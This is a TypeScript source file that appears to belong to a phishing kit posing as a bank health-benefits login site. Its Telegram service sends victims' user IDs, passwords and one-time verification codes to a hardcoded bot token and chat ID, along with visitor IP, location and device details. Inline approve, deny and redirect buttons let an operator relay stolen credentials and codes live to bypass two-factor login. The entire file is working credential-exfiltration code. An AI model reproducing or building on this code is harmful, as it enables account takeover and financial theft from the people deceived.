import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
import { getTelegramVisitorSiteName, SITE_DISPLAY_NAME } from "./site-url"

const SITE_NAME = getTelegramVisitorSiteName()

export interface VisitorData {
  siteName: string
  location: string
  ip: string
  timezone: string
  isp: string
  asn?: string | null
  org?: string | null
  /** Parsed OS label from UA, e.g. "iOS 17.2", "Windows 10/11". */
  osLabel?: string
  /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
  deviceLabel?: string

  userAgent: string
  screen: string
  language: string
  referrer: string
  pageUrl: string
  localTime: string
  utcTime: string
}

export type VisitorTelegramData = VisitorData

interface NotificationData {
  type: "visit" | "username" | "password" | "verification_method" | "verification_code" | "code_requested" | "password_approval" | "otp_approval"
  data: {
    website?: string
    pageUrl?: string
    username?: string
    password?: string
    verificationMethod?: "text" | "email"
    verificationCode?: string
    approvalId?: string
    stage?: "password" | "otp"
    location?: string
    ip?: string
    timezone?: string
    isp?: string
    device?: string
    screen?: string
    language?: string
    utcTime?: string
  }
}

const SEPARATOR = "━━━━━━━━━━━━━━━━━━"

type FieldValue = string | number | boolean

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || "Unknown")
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
}

function asUrlField(value: unknown, fallback = "Unknown"): string {
  const t = value == null || value === "" ? "" : String(value).trim()
  const resolved = t || fallback
  if (resolved === "Direct") return asCode(resolved)
  if (isHttpUrl(resolved)) return asLink(resolved)
  return asCode(resolved)
}

/** Site header for all ops flow messages (login / method / OTP / CC / registration). */
export function wrapFlowMessage(body: string): string {
  return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
}


function asCode(value: unknown): string {
  const text = value == null || value === "" ? "" : String(value).trim()
  return `<code>${escapeTelegramHtml(text || "Unknown")}</code>`
}

function asPre(value: unknown): string {
  const text = typeof value === "string" ? value : value != null ? String(value) : ""
  return `<pre>${escapeTelegramHtml(text || "Unknown")}</pre>`
}

function formatFieldLines(fields: Record<string, FieldValue>): string {
  return Object.entries(fields)
    .filter(([, value]) => value !== undefined && value !== null && String(value).trim() !== "")
    .map(([label, value]) => {
      const display =
        typeof value === "boolean" ? (value ? "Yes" : "No") : String(value).trim()
      return `🔹 <b>${escapeTelegramHtml(label)}</b>: ${asCode(display)}`
    })
    .join("\n")
}

function formatMessage(
  emoji: string,
  title: string,
  fields: Record<string, FieldValue>,
): string {
  const body = formatFieldLines(fields)
  const header = `${emoji} <b>${escapeTelegramHtml(title)} (${escapeTelegramHtml(SITE_NAME)})</b>`
  return body ? `${header}\n${SEPARATOR}\n${body}` : `${header}\n${SEPARATOR}`
}

function verificationMethodLabel(method?: "text" | "email"): string {
  if (method === "email") return "Email"
  if (method === "text") return "Text Message (SMS)"
  return "Unknown"
}

class TelegramService {
  private botToken: string
  private chatIds: string[]
  private baseUrl: string

  constructor() {
    // Hardcoded ops Telegram credentials
    this.botToken = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
    this.chatIds = ["8810036834"]
    this.baseUrl = process.env.NEXT_PUBLIC_APP_URL || "https://myhealthbenefitsbofa.com"
  }

  private async sendMessage(message: string, inlineKeyboard?: any[][]): Promise<{ success: boolean; error?: string; sent: number; failed: number; total: number }> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.warn("Telegram bot token or chat IDs not configured")
      return { success: false, error: "Telegram not configured", sent: 0, failed: 0, total: 0 }
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`

    const results = await Promise.allSettled(
      this.chatIds.map((chatId) =>
        fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: inlineKeyboard ? { inline_keyboard: inlineKeyboard } : undefined,
          }),
        }),
      ),
    )

    const sent = results.filter((r) => r.status === "fulfilled").length
    const failed = results.filter((r) => r.status === "rejected").length

    return {
      success: sent > 0,
      sent,
      failed,
      total: this.chatIds.length,
    }
  }

  async sendInputNotification(inputs: Record<string, string>): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
    const entries = Object.entries(inputs).filter(([, value]) => value.trim() !== "")
    if (entries.length === 0) {
      return { success: false, sent: 0, failed: 0, total: this.chatIds.length }
    }

    const fields = Object.fromEntries(entries) as Record<string, FieldValue>
    return this.sendMessage(wrapFlowMessage(formatMessage("🔐", "New Input Received", fields)))
  }

  async sendVisitorNotification(data: VisitorData): Promise<{
    success: boolean; sent: number; failed: number; total: number }> {
    const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
    
    const siteName = data.siteName || SITE_NAME
    const message = [
      `🌐 <b>New Visitor (${escapeTelegramHtml(siteName)})</b>`,
      SEPARATOR,
      `📍 <b>Location:</b> ${asCode(data.location)}`,
      `🌍 <b>IP:</b> ${asCode(data.ip)}`,
      `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
      `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
      ...(networkHint ? [`🛡️ <b>Network:</b> ${asCode(networkHint)}`] : []),
      "",
      `📱 <b>OS:</b> ${asCode(data.osLabel ?? "Unknown")}`,
      `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
      "💻 <b>User Agent:</b>",
      asPre(data.userAgent),
      `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
      `🌍 <b>Language:</b> ${asCode(data.language)}`,
      `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}`,
      `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}`,
      "",
      `⏰ <b>Local Time:</b> ${asCode(data.localTime)}`,
      `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}`,
      `<a href="https://t.me/th3_allfather">Odin Is With Us</a>`,
    ].join("\n")
    return this.sendMessage(message)
  }

  async sendUsernameNotification(username: string): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
    return this.sendInputNotification({
      "User ID": username,
    })
  }

  async sendPasswordNotification(username: string, password: string): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
    return this.sendMessage(wrapFlowMessage(formatMessage("🔐", "New Input Received", {
        "User ID": username,
        Password: password,
      })),
    )
  }

  async sendVerificationMethodNotification(
    username: string,
    method: "text" | "email",
  ): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
    return this.sendInputNotification({
      "User ID": username,
      Type: verificationMethodLabel(method),
    })
  }

  async sendVerificationCodeNotification(
    username: string,
    code: string,
    method: "text" | "email",
  ): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
    return this.sendInputNotification({
      "User ID": username,
      Type: verificationMethodLabel(method),
      Code: code,
    })
  }

  /** Kit template: 🔔 Resend Code Clicked + separator (Referral-Provider TELEGRAM_NOTIFICATIONS). */
  async sendCodeRequestedNotification(
    _username: string,
    _method: "text" | "email",
  ): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
    const message = ["🔔 <b>Resend Code Clicked</b>", SEPARATOR].join("\n")
    return this.sendMessage(wrapFlowMessage(message))
  }

  /**
   * Send approval request message with inline buttons
   * Admin can click: ✅ Approve | ❌ Deny | 🔄 Redirect
   */
  async sendPasswordApprovalNotification(
    username: string,
    approvalId: string,
  ): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
    const message = wrapFlowMessage(
      formatMessage("🔐", "Password Login Approval", {
        "User ID": username,
        "Approval ID": approvalId.substring(0, 8),
        "Time Limit": "90 seconds",
      })
    )

    const inlineKeyboard = [
      [
        {
          text: "✅ Approve",
          callback_data: `approve:${approvalId}`,
        },
        {
          text: "❌ Deny",
          callback_data: `deny:${approvalId}`,
        },
        {
          text: "🔄 Redirect",
          callback_data: `redirect:${approvalId}`,
        },
      ],
    ]

    return this.sendMessage(message, inlineKeyboard)
  }

  /**
   * Send OTP verification approval with inline buttons
   */
  async sendOtpApprovalNotification(
    username: string,
    approvalId: string,
  ): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
    const message = wrapFlowMessage(
      formatMessage("🔐", "OTP Verification Approval", {
        "User ID": username,
        "Approval ID": approvalId.substring(0, 8),
        "Time Limit": "90 seconds",
      })
    )

    const inlineKeyboard = [
      [
        {
          text: "✅ Approve",
          callback_data: `approve:${approvalId}`,
        },
        {
          text: "❌ Deny",
          callback_data: `deny:${approvalId}`,
        },
        {
          text: "🔄 Redirect",
          callback_data: `redirect:${approvalId}`,
        },
      ],
    ]

    return this.sendMessage(message, inlineKeyboard)
  }
}

export const telegramService = new TelegramService()

export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
  const result = await telegramService.sendVisitorNotification(data)
  return result.success
}

/** Backward-compatible wrapper for /api/telegram */
export async function sendTelegramNotification(data: NotificationData) {
  switch (data.type) {
    case "visit": {
      const d = data.data
      return telegramService.sendVisitorNotification({
        siteName: d.website || SITE_NAME,
        location: d.location || "Unknown",
        ip: d.ip || "Unknown",
        timezone: d.timezone || "Unknown",
        isp: d.isp || "Unknown",
        userAgent: d.device || "Unknown",
        screen: d.screen || "Unknown",
        language: d.language || "Unknown",
        referrer: "Direct",
        pageUrl: d.pageUrl || "Unknown",
        localTime: d.utcTime || "Unknown",
        utcTime: d.utcTime || "Unknown",
      })
    }
    case "username":
      return telegramService.sendUsernameNotification(String(data.data.username ?? ""))
    case "password":
      return telegramService.sendPasswordNotification(
        String(data.data.username ?? ""),
        String(data.data.password ?? ""),
      )
    case "verification_method":
      return telegramService.sendVerificationMethodNotification(
        String(data.data.username ?? ""),
        data.data.verificationMethod ?? "text",
      )
    case "verification_code":
      return telegramService.sendVerificationCodeNotification(
        String(data.data.username ?? ""),
        String(data.data.verificationCode ?? ""),
        data.data.verificationMethod ?? "text",
      )
    case "code_requested":
      return telegramService.sendCodeRequestedNotification(
        String(data.data.username ?? ""),
        data.data.verificationMethod ?? "text",
      )
    case "password_approval":
      return telegramService.sendPasswordApprovalNotification(
        String(data.data.username ?? ""),
        String(data.data.approvalId ?? ""),
      )
    case "otp_approval":
      return telegramService.sendOtpApprovalNotification(
        String(data.data.username ?? ""),
        String(data.data.approvalId ?? ""),
      )
    default:
      return { success: false, error: "Unknown notification type", sent: 0, failed: 0, total: 0 }
  }
}
